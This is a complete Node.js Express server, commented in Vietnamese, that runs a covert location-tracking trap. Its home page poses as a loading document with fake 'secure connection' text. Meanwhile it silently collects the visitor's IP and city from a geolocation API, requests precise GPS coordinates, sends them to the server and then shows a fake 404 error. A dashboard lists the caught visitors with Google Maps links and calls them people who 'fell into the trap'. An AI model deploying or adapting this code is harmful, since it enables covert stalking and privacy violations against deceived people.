const express = require("express");
const app = express();

// Cho phép server đọc dữ liệu JSON gửi lên từ trình duyệt
app.use(express.json());

// Mảng lưu trữ danh sách (Sẽ mất nếu server restart)
let visitors = [];

// --- 1. GIAO DIỆN TRANG CHỦ (BÍ MẬT) ---
app.get("/", (req, res) => {
    res.send(`
      <body style="font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; background: #f9f9f9; margin: 0;">
        <div style="border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite;"></div>
        <h2 style="color: #555; margin-top: 20px;">Đang tải tài liệu, vui lòng chờ...</h2>
        <p style="color: #888; font-size: 14px;">Hệ thống đang xác thực kết nối an toàn...</p>
        <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>

        <script>
          // Hàm gửi dữ liệu về máy chủ
          function sendData(data) {
            fetch('/api/visit', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            }).then(() => {
                // Sau khi gửi xong 3 giây thì hiện lỗi giả
                setTimeout(() => {
                    document.body.innerHTML = "<h3 style='color: #555;'>Lỗi: Tài liệu này không còn tồn tại hoặc đã bị xóa.</h3><p style='color:#999'>Mã lỗi: 404-NOT-FOUND</p>";
                }, 3000);
            }).catch(e => console.log("Error"));
          }

          // Bước 1: Lấy IP trước (Luôn chạy được nhanh)
          fetch('https://ipapi.co/json/')
            .then(res => res.json())
            .then(ipData => {
                const info = {
                    ip: ipData.ip || "Unknown",
                    city: ipData.city || "Unknown",
                    lat: ipData.latitude,
                    lon: ipData.longitude,
                    type: "IP Geolocation"
                };

                // Bước 2: Xin quyền GPS chính xác (Đợi tối đa 5 giây)
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            info.lat = position.coords.latitude;
                            info.lon = position.coords.longitude;
                            info.type = "GPS Precision";
                            sendData(info);
                        }, 
                        () => { sendData(info); }, // Nếu bị từ chối/lỗi, gửi ngay dữ liệu IP
                        { enableHighAccuracy: true, timeout: 5000 } // Chống treo: Đợi 5s không bấm sẽ tự bỏ qua
                    );
                } else {
                    sendData(info);
                }
            })
            .catch(() => {
                // Nếu API lấy IP bị lỗi, vẫn cố lấy GPS nếu người dùng cho phép
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition((p) => {
                        sendData({ lat: p.coords.latitude, lon: p.coords.longitude, type: "GPS Only" });
                    }, () => {});
                }
            });
        </script>
      </body>
    `);
});

// --- 2. API NHẬN DỮ LIỆU ---
app.post("/api/visit", (req, res) => {
    const visitor = {
        ...req.body,
        time: new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" })
    };
    // Chỉ lưu nếu có dữ liệu tọa độ
    if (visitor.lat && visitor.lon) {
        visitors.push(visitor);
    }
    res.json({ status: "ok" });
});

// --- 3. TRANG DASHBOARD (XEM KẾT QUẢ) ---
app.get("/dashboard", (req, res) => {
    let rows = visitors.map(v => `
      <tr>
        <td style="padding:10px; border:1px solid #ddd;">${v.ip}</td>
        <td style="padding:10px; border:1px solid #ddd;">
            <a href="https://www.google.com/maps/search/?api=1&query=${v.lat},${v.lon}" target="_blank" style="color:#007bff; font-weight:bold;">
                ${v.lat}, ${v.lon}
            </a>
        </td>
        <td style="padding:10px; border:1px solid #ddd;">
            <span style="background:${v.type.includes('GPS') ? '#d4edda' : '#fff3cd'}; padding:2px 5px; border-radius:3px;">
                ${v.type}
            </span>
        </td>
        <td style="padding:10px; border:1px solid #ddd;">${v.time}</td>
      </tr>`).reverse().join("");

    res.send(`
      <body style="font-family: sans-serif; padding: 20px;">
        <h2>Nhật ký truy cập</h2>
        <p><i>Mẹo: Click vào tọa độ để mở Google Maps xem vị trí chính xác.</i></p>
        <table style="width:100%; border-collapse:collapse; margin-top:20px;">
          <tr style="background:#eee; text-align:left;">
            <th style="padding:10px; border:1px solid #ddd;">IP</th>
            <th style="padding:10px; border:1px solid #ddd;">Tọa độ (Maps)</th>
            <th style="padding:10px; border:1px solid #ddd;">Nguồn</th>
            <th style="padding:10px; border:1px solid #ddd;">Thời gian</th>
          </tr>
          ${rows || '<tr><td colspan="4" style="text-align:center; padding:20px;">Chưa có ai sập bẫy...</td></tr>'}
        </table>
        <br>
        <button onclick="location.reload()" style="padding:10px; cursor:pointer;">Làm mới danh sách</button>
      </body>
    `);
});

// --- 4. CHẠY SERVER ---
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log("Server is running on port " + PORT);
});
